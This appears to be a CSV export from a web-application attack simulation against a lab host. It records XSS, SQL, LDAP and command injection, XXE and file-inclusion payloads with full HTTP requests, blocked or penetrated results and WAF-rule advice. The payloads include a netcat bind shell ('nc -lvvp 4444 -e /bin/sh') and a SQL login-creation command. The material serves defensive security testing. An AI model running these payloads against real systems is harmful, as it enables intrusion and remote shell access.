"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:52","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'><script>prompt(-[])</script>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:'><script>prompt(-[])</script>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 66
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""'><script>prompt(-[])</script>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:51","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\apache\php\php.ini","N/A","medium","https://ekslabs.cymulatedev.com\apache\php\php.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\apache\php\php.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /apache/php/php.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:51","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<video src=1 onerror=alert(1)>","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:<video src=1 onerror=alert(1)>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 322
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""<video src=1 onerror=alert(1)>"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:51","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","exec sp_addlogin 'name' , 'password' --","hidden","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:exec sp_addlogin 'name' , 'password' --.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 75
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""exec sp_addlogin 'name' , 'password' --""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:51","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","dir+c:\","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03j1=dir+c:\","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:dir+c:\.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03j1=dir+c:\ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:50","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","""(&(uid=*)(uid=*))(|(uid=*)(userPassword={27fe076f3f9ad7a444e7c27580d112b7}X03MO1qnZdYdgyfeuILPmQ==))"";","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03j0=""(&(uid=*)(uid=*))(|(uid=*)(userPassword={27fe076f3f9ad7a444e7c27580d112b7}X03MO1qnZdYdgyfeuILPmQ==))"";","penetrated","LDAP Injection","Create a WAF Security rule to block incoming requests that contains:""(&(uid=*)(uid=*))(|(uid=*)(userPassword={27fe076f3f9ad7a444e7c27580d112b7}X03MO1qnZdYdgyfeuILPmQ==))"";.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the LDAP Injection signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03j0=%22(&(uid=*)(uid=*))(|(uid=*)(userPassword={27fe076f3f9ad7a444e7c27580d112b7}X03MO1qnZdYdgyfeuILPmQ==))%22; HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:50","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","| sleep 1","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03iz=| sleep 1","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:| sleep 1.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03iz=|%20sleep%201 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:49","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'; EXEC ('SEL' + 'ECT US' + 'ER')","tel","high","https://ekslabs.cymulatedev.com","penetrated","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:'; EXEC ('SEL' + 'ECT US' + 'ER').
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 325
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""'; EXEC ('SEL' + 'ECT US' + 'ER')"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:49","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",") and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23","tel","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 371
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"") and 0=benchmark(3000000,MD5(1))%20--\n) and 0=benchmark(3000000,MD5(1))%20%23"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:49","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 115
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""\""><a href=\""\\x12javascript:javascript:alert(1)\"" id=\""fuzzelement1\"">test</a>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:48","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/DynaTracker_v151/action.php?base_path=https://app.cymulate.com","N/A","medium","https://ekslabs.cymulatedev.com/DynaTracker_v151/action.php?base_path=https://app.cymulate.com","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/DynaTracker_v151/action.php?base_path=https://app.cymulate.com.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /DynaTracker_v151/action.php?base_path=https://app.cymulate.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:48","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","| ls -l /home/*","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03iy=| ls -l /home/*","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:| ls -l /home/*.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03iy=|%20ls%20-l%20/home/* HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:48","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\home2\bin\stable\apache\php.ini","N/A","medium","https://ekslabs.cymulatedev.com\home2\bin\stable\apache\php.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\home2\bin\stable\apache\php.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /home2/bin/stable/apache/php.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:47","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","|/usr/bin/id|","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03ix=|/usr/bin/id|","penetrated","Command Injection - Unix","Create a WAF Security rule to block incoming requests that contains:|/usr/bin/id|.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Unix signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03ix=|/usr/bin/id| HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:47","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 518
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""\""><math href=\""javascript:javascript:alert(1)\"">CLICKME</math>  <math> <maction actiontype=\""statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html\"" xlink:href=\""javascript:javascript:alert(1)\"">CLICKME</maction> </math>"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:47","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/PHP/includes/header.inc.php?root=https://app.cymulate.com?","N/A","medium","https://ekslabs.cymulatedev.com/PHP/includes/header.inc.php?root=https://app.cymulate.com?","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/PHP/includes/header.inc.php?root=https://app.cymulate.com?.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /PHP/includes/header.inc.php?root=https://app.cymulate.com? HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:46","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",",(select * from (select(sleep(10)))a)","password","high","https://ekslabs.cymulatedev.com","blocked","Blind SQL Injection","Create a WAF Security rule to block incoming requests that contains:,(select * from (select(sleep(10)))a).
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Blind SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 329
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"",(select * from (select(sleep(10)))a)"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:46","XML Injections","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \""file:///c:/boot.ini\"">]>","password","high","https://ekslabs.cymulatedev.com","blocked","XML External Entity (XXE)","Create a WAF Security rule to block incoming requests that contains:<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \""file:///c:/boot.ini\"">]>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the XML External Entity (XXE) signature pack (XML Injections)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 437
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""<?xml version=\""1.0\"" encoding=\""ISO-8859-1\""?> <!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \\\""file:///c:/boot.ini\\\"">]>"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:46","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","' OR 'something' = 'some'+'thing'","password","high","https://ekslabs.cymulatedev.com","blocked","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:' OR 'something' = 'some'+'thing'.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 325
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""' OR 'something' = 'some'+'thing'"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:46","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","| whoami","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03iw=| whoami","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:| whoami.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03iw=|%20whoami HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:45","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","&& nc -lvvp 4444 -e /bin/sh &","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03iv=&& nc -lvvp 4444 -e /bin/sh &","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:&& nc -lvvp 4444 -e /bin/sh &.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03iv=&%20nc%20-lvvp%204444%20-e%20/bin/sh%20= HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:45","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/DFF_PHP_FrameworkAPI-latest/include/DFF_affiliate_client_API.php?DFF_config[dir_include]=https://app.cymulate.com","N/A","medium","https://ekslabs.cymulatedev.com/DFF_PHP_FrameworkAPI-latest/include/DFF_affiliate_client_API.php?DFF_config[dir_include]=https://app.cymulate.com","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/DFF_PHP_FrameworkAPI-latest/include/DFF_affiliate_client_API.php?DFF_config[dir_include]=https://app.cymulate.com.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /DFF_PHP_FrameworkAPI-latest/include/DFF_affiliate_client_API.php?DFF_config[dir_include]=https://app.cymulate.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:34:45","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","*(|(objectclass=*))","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03iu=*(|(objectclass=*))","penetrated","LDAP Injection","Create a WAF Security rule to block incoming requests that contains:*(|(objectclass=*)).
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the LDAP Injection signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03iu=*(|(objectclass=*)) HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
